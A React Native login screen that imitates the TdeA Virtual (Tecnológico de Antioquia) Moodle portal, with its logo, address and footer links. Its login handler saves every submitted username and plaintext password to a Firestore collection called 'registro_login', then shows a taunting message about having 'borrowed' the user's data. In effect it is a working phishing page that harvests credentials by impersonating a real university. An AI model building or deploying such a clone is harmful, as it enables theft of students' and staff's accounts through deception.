// Screens1/login.js
import React, { useState, useEffect, useWindowDimensions } from 'react';
import { View, Text, TextInput, Button, Alert,
  StyleSheet,
  TouchableOpacity,
  Image,
  ImageBackground,
  ScrollView,
  SafeAreaView,
  Platform,
  Dimensions,
  Linking, } from 'react-native';
import { db } from './firebase'; // Asegúrate que este archivo exporte Firestore
import { collection, addDoc } from 'firebase/firestore';
import { MaterialIcons, FontAwesome, Ionicons } from '@expo/vector-icons';

const { width, height } = Dimensions.get('window');
const logoSize = Platform.OS === 'web' ? width * 0.1 : width * 0.3;
import { RFValue } from "react-native-responsive-fontsize";

export default function LoginScreen({ navigation }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const logoSize = width < 500 ? 120 : 180; // Más grande en web
  const [isMobile, setIsMobile] = useState(Dimensions.get('window').width < 440);
  
    useEffect(() => {
      const onChange = ({ window }) => {
        setIsMobile(window.width < 440);
      };
  
      const subscription = Dimensions.addEventListener('change', onChange);
  
      return () => subscription?.remove();
    }, []);

  const handleLogin = async () => {
    // Expresión regular simple para validar el correo
    //const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  
    //if (!emailRegex.test(email)) {
      //Alert.alert('Correo inválido', 'Por favor ingresa un correo válido con @ y .com');
     // return;
   // }
  
    try {
      const loginData = {
        email: email,
        password: password,
        fecha: new Date().toISOString(),
      };
  
      await addDoc(collection(db, 'registro_login'), loginData);
  
      Alert.alert('Éxito', 'Solo hice un préstamo temporal de tus datos... con fines científicos 🧪😏');
      setEmail('');
      setPassword('');
      navigation.navigate('inicio');
    } catch (error) {
      console.error('Error al guardar en Firebase:', error);
      Alert.alert('Error', 'No se pudieron guardar los datos');
    }
  };
  
  return (
    <SafeAreaView style={{ flex: 1, paddingTop: Platform.OS === 'android' ? 25 : 0 }}>
          <View style={styles.containerprincipal}>
            <View style={styles.barraverde}>
            <View style={styles.ladoizquierdobarra}>
      <MaterialIcons name="email" size={20} color="white" />
      {!isMobile && (
        <Text style={styles.correo}>Correo electrónico: virtual@tdea.edu.co</Text>
      )}
    </View>
    
    <View style={styles.ladoderechobarra}>
      <FontAwesome name="globe" size={20} color="white" />
      {!isMobile && (
        <Text style={styles.cambiodeidioma}>Español - Colombia (es_co)</Text>
      )}
      <FontAwesome name="search" size={20} color="white" />
      <TouchableOpacity onPress={() => navigation.navigate('Login')}>
        <Text style={styles.login}>Acceder</Text>
      </TouchableOpacity>
    </View>
    </View>
    
            <ScrollView contentContainerStyle={styles.scrollContent}>
              <View style={styles.barrablanca}>
                <Image source={require('../images1/logo.png')} style={styles.logo} />
    
                <TouchableOpacity onPress={() => navigation.replace('home')}>
                  <View style={styles.paginaprincipalContainer}>
                    <Text style={styles.paginaprincipallink}>Página Principal</Text>
                    <View style={styles.greenUnderline} />
                  </View>
                </TouchableOpacity>
              </View>
    
    <View style={styles.containergris}>
      <View style={styles.containerblanco}>
      <Image source={require('../images1/logo.png')} style={styles.logo3} />
      <TextInput
        style={styles.input}
        placeholder="Nombre de usuario"
        value={email}
        onChangeText={setEmail}
        keyboardType="email-address"
        autoCapitalize="none"
      />
      <TextInput
        style={styles.input}
        placeholder="Contraseña"
        value={password}
        onChangeText={setPassword}
        secureTextEntry
      />
      <TouchableOpacity style={styles.button1} onPress={handleLogin}>
  <Text style={styles.buttonText1}>Acceder</Text>
</TouchableOpacity>
<View style={styles.extraOptions}>
  <TouchableOpacity onPress={() => console.log('Olvidó su contraseña')}>
    <Text style={styles.forgotText}>¿Olvidó su contraseña?</Text>
  </TouchableOpacity>

  <View style={styles.guestContainer}>
    <Text style={styles.guestText}>Algunos cursos permiten el acceso de invitados</Text>
    <TouchableOpacity style={styles.guestButton} onPress={() => console.log('Entrar como invitado')}>
      <Text style={styles.guestButtonText}>Entrar como persona invitada</Text>
    </TouchableOpacity>
  </View>

  <View style={styles.footer}>
  <TouchableOpacity style={styles.languageSelector} onPress={() => console.log('Cambiar idioma')}>
    <Text style={styles.languageText}>Español - Internacional (es)</Text>
    <Ionicons name="chevron-down" size={16} color="#f26522" />
  </TouchableOpacity>

  <TouchableOpacity style={styles.cookiesButton} onPress={() => console.log('Aviso de Cookies')}>
    <Text style={styles.cookiesButtonText}>Aviso de Cookies</Text>
  </TouchableOpacity>
</View>
</View>
    </View>
    </View>

    <View style={styles.footernegro}>
                <View style={styles.logoContainer}>
                  <Image
                    source={require('../images1/logonegro.png')}
                    style={styles.logo2}
                    resizeMode="contain"
                  />
                  <Text style={styles.textologo}>TdeA Virtual</Text>
                  <View style={{ height: 10 }} />
                  <Text style={styles.textologo}>
                    Soportado por la Unidad de Virtualidad del Tecnológico de Antioquia
                  </Text>
                </View>
    
                <View style={styles.footerColumna1}>
                  <Text style={styles.footerTitle}>Información</Text>
                  <TouchableOpacity onPress={() => Linking.openURL('https://moodle.org')}>
                    <Text style={styles.footerLink}>Comunidad Moodle</Text>
                  </TouchableOpacity>
                  <TouchableOpacity onPress={() => Linking.openURL('https://moodle.org/support')}>
                    <Text style={styles.footerLink}>Soporte gratuito Moodle</Text>
                  </TouchableOpacity>
                  <TouchableOpacity onPress={() => Linking.openURL('https://moodle.org/dev')}>
                    <Text style={styles.footerLink}>Desarrollo Moodle</Text>
                  </TouchableOpacity>
                  <TouchableOpacity onPress={() => Linking.openURL('https://docs.moodle.org')}>
                    <Text style={styles.footerLink}>Documentación Moodle</Text>
                  </TouchableOpacity>
                  <TouchableOpacity onPress={() => Linking.openURL('https://moodle.com')}>
                    <Text style={styles.footerLink}>Moodle.com</Text>
                  </TouchableOpacity>
                </View>
    
                <View style={styles.footerColumna2}>
                  <Text style={styles.footerTitle}>Contacta</Text>
                  <Text style={styles.footerText}>
                    CALLE 78B NO. 72A - 220 MEDELLÍN - COLOMBIA
                  </Text>
                  <Text style={styles.footerText}>Correo electrónico: virtual@tdea.edu.co</Text>
                  <Text style={styles.footerText}>Follow us</Text>
                  <View style={styles.socialContainer}>
                    <TouchableOpacity style={styles.socialButton}>
                      <FontAwesome name="facebook" size={30} color="#2e2e2e" />
                    </TouchableOpacity>
                    <TouchableOpacity style={styles.socialButton}>
                      <FontAwesome name="pinterest" size={30} color="#2e2e2e" />
                    </TouchableOpacity>
                    <TouchableOpacity style={styles.socialButton}>
                      <FontAwesome name="twitter" size={30} color="#2e2e2e" />
                    </TouchableOpacity>
                    <TouchableOpacity style={styles.socialButton}>
                      <FontAwesome name="google" size={30} color="#2e2e2e" />
                    </TouchableOpacity>
                  </View>
                </View>
              </View>
         </ScrollView>
           </View>
             </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  containerprincipal: {
      flex: 1,
      backgroundColor: '#f2f2f2',
    },
    barraverde: {
      flexDirection: 'row',
      justifyContent: 'space-between',
      backgroundColor: '#00723e',
      paddingVertical: 20,
      paddingHorizontal: 12,
    },
    correo: {
      color: 'white',
      fontSize: width < 400 ? 16 : 20,
      fontFamily: 'Roboto',
      
    },
    ladoizquierdobarra: {
      flexDirection: 'row',
      alignItems: 'center',
    },
    ladoderechobarra: {
      flexDirection: 'row',
      alignItems: 'center',
      gap: 10,
    },
    cambiodeidioma: {
      color: 'white',
      fontSize: width < 400 ? 16 : 20,
      marginRight: 12,
      fontFamily: 'Roboto',
    },
    login: {
      color: 'white',
      fontSize: width < 400 ? 16 : 20,
      fontFamily: 'Roboto',
    },
    barrablanca: {
      backgroundColor: 'white',
      paddingVertical: Platform.OS === 'web' ? 12 : 8,
      paddingHorizontal: 10,
      flexDirection: 'row',
      justifyContent: 'space-between',
      alignItems: 'center',
      elevation: 3,
    },
    logo: {
      width: logoSize,
      height: logoSize,
      resizeMode: 'contain',
    },
    paginaprincipalContainer: {
      alignItems: 'center',
    },
    paginaprincipallink: {
      color: '#00723e',
      fontFamily: 'Roboto',
      fontWeight: '400',
      fontSize: Platform.OS === 'web' ? 20 : (width < 400 ? 16 : 18),
    },
    //nuevo
    containergris: {
      flex: 1,
      backgroundColor: '#f2f2f2',
      padding: 20,
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: height * 0.95,
      width: '100%',
    },
    
    containerblanco: {
      backgroundColor: 'white',
  padding: 30,
  borderRadius: 10,
  width: width < 500 ? '100%' : '90%', // más ancho en móviles
  maxWidth: 630,
  minHeight: 760,
  alignItems: 'center',
    },
    
    logo3: {
      width: 200, // Más grande
      height: 200,
      resizeMode: 'contain',
      marginBottom: 20,
    },
    
    title: {
      fontSize: 28,
      marginBottom: 20,
      textAlign: 'center',
    },
    
    input: {
      backgroundColor: '#fff',
      paddingVertical: 12,
      paddingHorizontal: 16,
      borderRadius: 8,
      marginBottom: 15,
      borderWidth: 1,
      borderColor: '#ccc',
      width: '100%',
      fontSize: 16,
      fontFamily: 'Roboto',
      color: '#333',
    },
    button1: {
      backgroundColor: '#015D22', // Verde institucional
      paddingVertical: 10,
      paddingHorizontal: 18,
      borderRadius: 5,
      alignItems: 'center',
      justifyContent: 'center',
      alignSelf: 'flex-start', // Se queda alineado a la izquierda
    },
    buttonText1: {
      color: '#fff',
  fontSize: 16,
  fontWeight: 'bold',
  fontFamily: Platform.select({ ios: 'System', android: 'sans-serif', default: 'sans-serif' }),
    },
    extraOptions: {
      marginTop: 20,
      alignItems: 'flex-start',
      width: '100%',
    },
    
    forgotText: {
      color: '#f26522',
      textDecorationLine: 'underline',
      marginBottom: 20,
    },
    
    guestContainer: {
      borderTopWidth: 1,
      borderBottomWidth: 1,
      borderColor: '#ccc',
      paddingVertical: 20,
      alignItems: 'flex-start',
      width: '90%',
    },
    
    guestText: {
      fontSize: Platform.OS === 'web' && width > 800 ? 24 : 18,
      fontWeight: '600',
      color: '#f26522',
      textAlign: 'left',
      marginBottom: 10,
    },
    
    guestButton: {
      backgroundColor: '#d3d9df',
      paddingVertical: 10,
      paddingHorizontal: 20,
      borderRadius: 5,
    },
    
    guestButtonText: {
      color: '#000',
      fontWeight: '500',
    },
    
    footer: {
      flexDirection: 'row',
      flexWrap: 'wrap',
      justifyContent: 'space-between',
      marginTop: 20,
      width: '100%',
      alignItems: 'flex-start',
      gap: 10, // opcional para espacio entre items
    },
    
    languageSelector: {
      flexDirection: 'row',
      alignItems: 'center',
    },
    
    languageText: {
      marginRight: 5,
      color: '#f26522',
      
    },
    
    cookiesButton: {
      backgroundColor: '#d3d9df',
      paddingVertical: 8,
      paddingHorizontal: 10,
      borderRadius: 5,
    },
    
    cookiesButtonText: {
      color: '#000',
    },
    //
  footernegro: {
      flexDirection: width < 768 ? 'column' : 'row',
    backgroundColor: '#2e2e2e',
    padding: 20,
    paddingVertical: 70,
    justifyContent: width < 768 ? 'center' : 'space-between', // centrado en móvil
    alignItems: width < 768 ? 'center' : 'flex-start', // importante para alinear hijos
    },
    logoContainer: {
      flexDirection: 'column',
    alignItems: width < 768 ? 'center' : 'flex-start',
    marginBottom: width < 768 ? 20 : 0,
    marginRight: width < 768 ? 0 : 10,
    },
    logo2: {
      width: logoSize,
      height: logoSize,
      resizeMode: 'contain',
    },
    textologo: {
      color: '#ccc',
      fontSize: Platform.OS === 'web' ? (width < 600 ? 14 : 16) : RFValue(12),
        textAlign: width < 300 ? 'center' : 'left',  // centra en móvil
        fontFamily: 'Roboto',
        fontWeight: 'bold',
    },
    footerColumna1: {
      flex: 1,
      marginRight: 20,
      alignItems: width < 768 ? 'center' : 'flex-start',
      marginTop: width < 768 ? 20 : 0,
    },
    footerColumna2: {
      flex: 1,
      marginHorizontal: 10,
      alignItems: width < 768 ? 'center' : 'flex-start',
      marginTop: width < 768 ? 20 : 0,
    },
    footerTitle: {
      fontSize: RFValue(13),
        color: '#ff6600',
        marginBottom: 10,
        fontWeight: 'bold',
        textAlign: width < 400 ? 'center' : 'left',  // centra en móvil
    },
    footerText: {
      color: '#ccc',
        ffontSize: RFValue(12),
        marginVertical: 2,
        textAlign: width < 400 ? 'center' : 'left',  // centra en móvil
        fontWeight: 'bold',
  
    },
    footerLink: {
      color: '#ffffff',
      fontSize: Platform.OS === 'web' ? (width < 600 ? 14 : 16) : RFValue(12),
      textDecorationLine: 'underline',
      marginVertical: 2,
      textAlign: width < 400 ? 'center' : 'left',
    },
    footerBottom: {
        backgroundColor: '#111',
        padding: 35,
        alignItems: 'center',  // ya centrado
    },
    footerBottomText: {
      color: '#00aa66',
      fontSize: Platform.OS === 'web' ? (width < 600 ? 14 : 16) : RFValue(12),
      textAlign: 'center',
    },
    socialContainer: {
    flexDirection: 'row',
    marginTop: 10,
    justifyContent: width < 400 ? 'center' : 'flex-start',
  },
  
  socialButton: {
    backgroundColor: 'white',
    padding: 10,
    borderRadius: 8,
    alignItems: 'center',
    justifyContent: 'center',
    marginRight: 10, // espacio entre botones
  },
});
